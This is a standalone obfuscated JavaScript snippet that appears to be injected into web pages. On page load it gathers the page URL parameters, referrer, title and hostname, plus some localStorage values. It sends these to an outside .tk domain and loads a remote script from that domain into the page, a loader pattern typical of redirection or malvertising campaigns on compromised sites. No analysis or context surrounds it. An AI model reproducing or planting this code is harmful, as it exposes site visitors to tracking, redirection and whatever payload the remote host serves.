  (function() {
    var name = '_mCYjh2RS5qg7G2K9';
    if (!window._mCYjh2RS5qg7G2K9) {
        window._mCYjh2RS5qg7G2K9 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://heirisotocara.tk/bannas',
        };
    }
    const _FvCdGRyx4mcZkRpK = localStorage.getItem('config');
    if (typeof _FvCdGRyx4mcZkRpK !== 'undefined' && _FvCdGRyx4mcZkRpK !== null) {
        var _1RvHdvr1CPWRvtz3 = JSON.parse(_FvCdGRyx4mcZkRpK);
        var _RKrr84Nqt3dwvLCt = Math.round(+new Date()/1000);
        if (_1RvHdvr1CPWRvtz3.created_at + window._mCYjh2RS5qg7G2K9.ttl < _RKrr84Nqt3dwvLCt) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _b5jH97SPtSspKpH4 = localStorage.getItem('subId');
    var _DybJjtzwFnJcL5f7 = localStorage.getItem('token');
    var _944YS5RYpVF1b6Dp = '?return=js.client';
        _944YS5RYpVF1b6Dp += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _944YS5RYpVF1b6Dp += '&se_referrer=' + encodeURIComponent(document.referrer);
        _944YS5RYpVF1b6Dp += '&default_keyword=' + encodeURIComponent(document.title);
        _944YS5RYpVF1b6Dp += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _944YS5RYpVF1b6Dp += '&name=' + encodeURIComponent(name);
        _944YS5RYpVF1b6Dp += '&host=' + encodeURIComponent(window._mCYjh2RS5qg7G2K9.R_PATH);
    if (typeof _b5jH97SPtSspKpH4 !== 'undefined' && _b5jH97SPtSspKpH4 && window._mCYjh2RS5qg7G2K9.unique) {
        _944YS5RYpVF1b6Dp += '&sub_id=' + encodeURIComponent(_b5jH97SPtSspKpH4);
    }
    if (typeof _DybJjtzwFnJcL5f7 !== 'undefined' && _DybJjtzwFnJcL5f7 && window._mCYjh2RS5qg7G2K9.unique) {
        _944YS5RYpVF1b6Dp += '&token=' + encodeURIComponent(_DybJjtzwFnJcL5f7);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._mCYjh2RS5qg7G2K9.R_PATH + _944YS5RYpVF1b6Dp;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
